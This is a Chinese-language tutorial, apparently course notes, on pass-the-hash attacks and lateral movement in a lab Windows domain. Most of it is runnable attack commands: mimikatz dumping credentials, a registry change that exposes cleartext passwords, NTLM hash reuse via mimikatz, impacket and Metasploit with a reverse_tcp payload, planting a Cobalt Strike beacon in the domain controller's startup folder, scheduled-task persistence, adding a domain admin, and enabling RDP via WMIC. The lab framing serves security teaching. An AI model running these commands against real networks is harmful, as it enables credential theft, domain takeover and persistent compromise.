[TOC]



# ==哈希传递攻击PTH==

教材内容

#### 一、PTH简介

##### 1、攻击原理

 在使用 NTLM 身份验证的系统或服务上，用户密码永远不会以明文形式通过网络发送。 Windows 上的应用程序要求用户提供明文密码，然后调用 LsaLogonUser 类的 API，将该密码转换为一个或两个哈希值（LM或NTLM hash），然后将其发送到远程服务器进行 NTLM 身份验证。由于这种机制，我们只需要哈希值即可成功完成网络身份验证，而不需要明文密码。于是当我们获取到任意用户的 Hash 值就可以针对远程系统进行身份验证并模拟该用户，从而获取用户权限。PTH全称为：Pass The Hash，哈希传递攻击。

##### 2、使用原因

- 在Windows Server 2012 R2及之后版本的操作系统中，默认在内存中不会记录明文密码，只保存用户的 Hash。所以无法抓取到 lsass.exe 进程中的明文密码。
- 随着信息安全意识的提高，大家都使用强密码，很多时候即使能拿到 hash 却无法解开。

##### 3、LM Hash 与 NTLM Hash

1.3.1 LM Hash

（1）LM Hash（LAN Manager Hash）：微软为了提高Windows操作系统的安全性而采用的散列加密算法。

存在的问题——易被破解：LM Hash明文密码被限制在14位以内，其本质上采用的是 DES 加密算法，所以 LM Hash 存在较容易被破解的问题。于是从 Windows Vista 和Windows Server 2008开始的 Windows 系统默认禁用了 LM Hash 。这里只是禁用，主要是为了保证系统的兼容性。如果LM Hash被禁用了，攻击者使用工具抓取的 LM Hash 通常为”aad3b435b51404eeaad3b435b51404ee”。

##### （2）NTLM Hash

NTLM Hash（NT LAN Manager）：为了在提高安全性的同时保证兼容性，微软提出了 Windows NT 挑战/响应验证机制，称之为 NTLM 。个人版 Windows 从Windwos Vista 以后，服务器版本系统从 Windows server2003 以后，其认证方式均为 NTLM Hash。

#### 二、PTH 攻击

##### 1、实验环境

域控DC：Windows Server 2008（dc.ymqyyds.com）

 IP：192.168.230.132（域管用户[域]：administrator）

![image-20241106224920768](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241106224920768.png)

域内计算机：Windows 7-1

 IP：192..168.230.129（本地管理员[工作组]：administrator）（同时也是ymqyyds.com域中的用户yang）

![image-20241106225104089](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241106225104089.png)

域内计算机：Windows 7-2

 IP：192..168.230.133（本地管理员[工作组]：administrator）（同时也是ymqyyds.com域中的用户ming）

![image-20241107100734646](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241107100734646.png)

攻击机kali：

IP：192.168.230.128（为了方便演示，此处就不做内外网的划分，kali与域环境同处一个网段）

域：ymqyyds.com

##### 2、使用 mimikatz 进行 PTH

- 内网渗透进该域主机，此时获得的是该域主机的普通权限
- 然后进行提权，得到该域主机的本地管理员权限，最终目的获取域控的C$ 共享目录访问权限
- 接下来再运行mimikatz

 此处实验环境，所以直接上传 mimikatz 到 win7 上，假设我们获取了本地管理员权限，且域管理员登录到过这台电脑上并且没有被注销（能从内存中获取域管理员的 NTML Hash）。

> 比如一个木马上传连接上cs之后，我win7的虚拟机就用这个 ms14-058 可以实现提权
>
> ![image-20241107114602759](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241107114602759.png)

 在具有管理员权限（或者使用管理员权限运行）的 cmd 中运行 mimikatz.exe，获取debug权限，而后查询当前机器中所有可用凭证。

```
log                            
# 在当前目录下写日志，输出结果均在日志中

privilege::debug             
# 提升至调试（debug）权限（需要本地管理员权限）

sekurlsa::logonpasswords     
# 查看所有可用的凭证（登录到本机的所有用户）
```

![image-20241107151237345](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241107151237345.png)

但是由于该版本的win7稍微高了一点，导致明文密码不可见，所以现在我们需要修改注册表使得mimikatz抓取出该机器的明文密码

如果目标主机是Windows2012或更高版本，默认情况下是无法查看明文密码的，可以按照以下方式查看：

```
添加注册表：
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

强制锁屏：
rundll32 user32.dll,LockWorkStation

查看明文密码: 
mimikatz.exe 
log 
privilege::Debug 
sekurlsa::logonpasswords exit   
# 直接运行Mimikatz命令，不进入交互模式
```

![image-20241107151906948](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241107151906948.png)

 查找到域管理员的凭证信息，如上图，可以看到用户名为 Administrator ，属于ymqyyds这个域，登录的服务器为 WIN-4SN3TCADRPV。获取到域管理员的 NTLM Hash。

 利用 mimikatz 进行 PTH 攻击，命令如下：

```
# sekurlsa::pth /user:用户名 /domain:域名或者域控IP /ntlm:用户的NTLM Hash

# 例子如下
sekurlsa::pth /user:administrator  /domain:192.168.230.132  /ntlm:9099d68602a60f007c227c4fa95fada6

sekurlsa::pth /user:administrator  /domain:ymqyyds  /ntlm:aabad3aded31181a2cdb889048447464
```

![image-20241107152229079](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241107152229079.png)

会弹出一个cmd，在弹出的cmd中，可以直接连接该主机（域控）、查看目录文件等操作。

```
dir \\192.168.230.132\c$    # 查看ymqyyds域控的C盘
```

![image-20241107152340119](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241107152340119.png)

##### 3、在域控上执行木马

（1）尝试往域控的自启动目录中写入木马文件，拿下域控。

```
copy C:\http_beacon_x64.exe "\\192.168.230.132\c$\Users\Administrator\AppData\Roaming\Microsoft\Windows"

# 或者上传木马至Windows的自启动目录，当主机开机时，该目录下的程序就会自动开始运行
copy C:\http_beacon_x64.exe "\\192.168.230.132\c$\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```

![image-20241107155749542](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241107155749542.png)

重新登录一下，木马即可上线。

（2）也可以复制木马文件后，直接使用psexec.exe执行命令的方式直接启动木马：

```
copy ..\http_beacon.exe \\dcadmin\c$\Tools    
# 将木马文件复制到域控主机

PsExec.exe \\192.168.230.132 cmd.exe /c "c$\Users\Administrator\AppData\Roaming\Microsoft\Windows\http_beacon_x64.exe"

# 为了更好的保持权限维持，也可以使用Windows的定时任务命令schtasks.exe创建定时运行的任务，如每天凌晨2点30分运行（以前的定时任务命令叫 at）

SCHTASKS /Create /TN HTTPBeacon /TR C:\Tools\http_beacon.exe /ru Administrator /SC DAILY /ST 02:30

（at \\192.168.230.132 20:00 cmd.exe /c "C:\share\http_beacon_x64.exe"）
```

> 更多关于schtasks命令的用法，参考：https://blog.csdn.net/qq_39680564/article/details/88993633

![image-20241107155224598](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241107155224598.png)

![image-20241107155810772](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241107155810772.png)

（3）还可以直接使用psexec工具在域控上获取一个反弹Shell，用于执行命令：

```
PsExec.exe \\dcadmin cmd.exe

net user username password /add

net group "domain admins" username /add
```

> Mimikatz的用法：https://shanfenglan.blog.csdn.net/article/details/108266353

（4）更多操作，均依赖于Windows可用命令，不再赘述

最后发现 cs 中 域控主机已上线

![image-20241107155950264](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241107155950264.png)

#### 三、在MSF和CS中操作和利用

##### 1、使用Kiwi模块

```
meterpreter > hashdump
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > kiwi_cmd sekurlsa::logonpasswords
```

##### 2、使用psexec模块

```
use exploit/windows/smb/psexec
show options
set payload windows/meterpreter/reverse_tcp
set RHOST 192.168.219.144
set SMBUser administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:beeabbdf97a07d8356dbb2bbf617e1ba
show options
```

直接可以拿下域控。附：PSTools工具中自带命令的功能：

```
PsExec - 远程执行进程
PsFile - 显示远程打开的文件
PsGetSid - 显示计算机或用户的 SID
PsInfo - 列出有关系统的信息PsPing - 测量网络性能
PsKill - 按名称或进程 ID 终止进程
PsList - 列出有关进程的详细信息
PsLoggedOn - 查看本地登录的用户以及通过资源共享 (完整源包含)PsLogList - 转储事件日志记录
PsPasswd - 更改帐户密码
PsService - 查看和控制服务
PsShutdown - 关闭并选择性地重启计算机
PsSuspend - 挂起进程
```

> 微软在线帮助手机：https://learn.microsoft.com/zh-cn/sysinternals/downloads/psexec

##### 3、在CS中进行横向移动

（1）拿下域中某台主机，并确保CS上线

（2）运行net view，查看域内主机列表

![image-20241109184602604](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241109184602604.png)

（3）先诱骗域控主机在受控主机上登录并没有注销过，之后再在受控主机上右键运行Access -> Dump Hashes，获取所有Hash值，在通过View -> Credentials 查看所有Hash值列表。

![image-20241109185314860](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241109185314860.png)

登陆成功后说明域控在 win7 上已经有缓存的账密信息了，此时在 cs 中 dump hash就可以看到 域控 的密码（在 Crendentional 里可以看到）

（4）在Targets视图中，找到域内主机，右键Jump，并利用Hash进行登录上线。

![image-20230812215126438](https://gitee.com/ymq_typroa/typroa/raw/main/202308122151530.png)

这里选择先上线域控，再上线其他域内主机 

![image-20241109190143758](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241109190143758.png)

![image-20241109190335532](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241109190335532.png)

![image-20241109190350761](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241109190350761.png)



（4）使用 梼杌 或 谢公子 等CS插件，可以更加方便地获取域信息，制作票据，进行横向移动等。

##### 4、在CS中利用进程注入获得域控权限

（1）只要是域管理员登录到Windows7主机上（无论是本地登录，或是远程桌面登录），则在Windows7中就存在域管理权限的进程，可以利用该进程提权到域管理员权限。

（2）浏览Windows7 的进程，并选择一个属于Woniuxy\Administrator用户的进程，进行Inject注入，再选择一个木马，即可以域管理员权限上线该木马。

![image-20230816150410602](https://gitee.com/ymq_typroa/typroa/raw/main/202308161504023.png)

（3）在该上线的木马中运行 `shell dir \\dcadmin\c$` ，发现可以访问，后续操作一致。

此时访问的就是 域控主机 的目录了，但是还是在 win7 这台机器上操作的

![image-20241109192707751](https://gitee.com/ymq_typroa/typroa/raw/main/image-20241109192707751.png)

#### 四、使用 PsExec 进行横向移动

 PsExec 是 windows 官方发布的，所以不会存在查杀问题，其属于 pstools 。利用 PsExec 可以在远程计算机上执行命令，其基本原理是通过管道在远程目标主机上创建一个psexec 服务，并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件，然后通过psexec 服务运行命令，运行结束后删除服务。

官方下载地址：https://learn.microsoft.com/en-us/sysinternals/downloads/pstools

 当知道域用户名密码可以使用 PsExec.exe 与对应主机建立启动交互式命令，如下，在win7 上执行成功连接至dc。

```
PsExec.exe /accepteula /s \\192.168.219.144 -u Administrator -p p-0p-0p-0 cmd    # 单独使用psexec时需要指定密码

# 如果使用进程注入的话，我们可以使用如下的方式 shell + 命令来实现木马的上线
shell PsExec.exe /accepteula /s \\192.168.219.144 cmd.exe /c "C:\share\http_beacon_x64.exe"
```

![image-20230305165232163](https://gitee.com/ymq_typroa/typroa/raw/main/202303051652204.png)

 也可以直接执行命令

```
PsExec.exe /accepteula /s \\192.168.219.144 -u Administrator -p p-0p-0p-0 cmd /c "ipconfig"
```

![image-20230305164758869](https://gitee.com/ymq_typroa/typroa/raw/main/202303051647911.png)

 还可以使用 impacket 工具包的 psexec.py 脚本进行利用，这里展示通过 hash 的方式认证。

```
python3 psexec.py -hashes 1111:9099d68602a60f007c227c4fa95fada6 ./Administrator@192.168.219.144
或使用密码登录：
python3 psexec.py administrator:p-0p-0p-0@192.168.219.144
```

![image-20230305162816809](https://gitee.com/ymq_typroa/typroa/raw/main/202303051630139.png)

如果能直接在域控主机上执行命令，你最想执行什么命令？

#### 五、使用 wmic 进行横向移动

 WMIC 扩展了 WMI （ Windows Management Instrumentation ， Windows 管理工具），提供了从命令行接口和批处理脚本执行系统管理的支持。Windows 98 以后的操作系统都支持 WMI。由于 Windows 默认不会将 WMI 的操作记录在日志里，同时现在越来越多的杀软将 PsExec 加入了黑名单，因此 WMIC 比 PsExec 隐蔽性要更好一些。

##### 1、Windows 自带的 wmic

 这里在 win7 上使用 wmic 在 DC 上远程执行 ipconfig 并将内容输出到 c:\ip.txt （DC的）。

```
wmic /node:"192.168.219.144" /user:"administrator" /password:"p-0p-0p-0" process call create "cmd.exe /c ipconfig > c:\ip.txt"
```

![image-20230305190450935](https://gitee.com/ymq_typroa/typroa/raw/main/202303051904973.png)

 而后再构建 ipc$ 管道，产看DC上的 ip.txt。

 IPC$（Internet Process Connection）是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。

```
net use \\192.168.219.144\ipc$ "p-0p-0p-0" /user:administratortype \\192.168.219.144\c$\ip.txt
```

![image-20230305190141178](https://gitee.com/ymq_typroa/typroa/raw/main/202303051901215.png)

wmic其他利用方式——开启远程主机的 RDP

```
# 适于 Windows xp、server 2003wmic /node:"192.168.219.144" /user:"administrator" /password:"p-0p-0p-0" PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1 wmic /node:"192.168.219.144" /user:"administrator" /password:"p-0p-0p-0" RDTOGGLEWHERE ServerName='dc' call SetAllowTSConnections 1或者wmic /node:192.168.0.123 /user:administrator /password:123456 process call create 'cmd.exe /c REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
```

##### 2、wmiexec.py 的使用

 这里也可以用 impacket 工具包的 wmiexec.py 脚本进行利用，创建交互式命令行。

```
python3 /usr/local/bin/wmiexec.py administrator:p-0p-0p-0@192.168.219.144
```

![image-20230305180057121](https://gitee.com/ymq_typroa/typroa/raw/main/202303051800156.png)

 或者使用 hash 直接执行命令。

```
python3 /usr/local/bin/wmiexec.py -hashes 1111:9099d68602a60f007c227c4fa95fada6 Administrator@192.168.219.144 "whoami"
```

![image-20230305175854187](https://gitee.com/ymq_typroa/typroa/raw/main/202303051758223.png)

##### 3、wmiexec.vbs

 wmiexec.vbs脚本通过VBS调用WMI来模拟PsExec的功能。其可以在远程系统中执行命令并进行回显，或者获取远程主机的交互式Shell。

 获取dc的交互式命令行，如下。

```
cscript //nologo wmiexec.vbs /shell 192.168.219.144 administrator p-0p-0p-0
```

![image-20230305192310388](https://gitee.com/ymq_typroa/typroa/raw/main/202303051923427.png)

 使用 wmiexec.vbs 执行命令，如下：

```
cscript //nologo wmiexec.vbs /cmd  192.168.219.144 administrator  p-0p-0p-0 "whoami"
```

![image-20230305193412393](https://gitee.com/ymq_typroa/typroa/raw/main/202303051934443.png)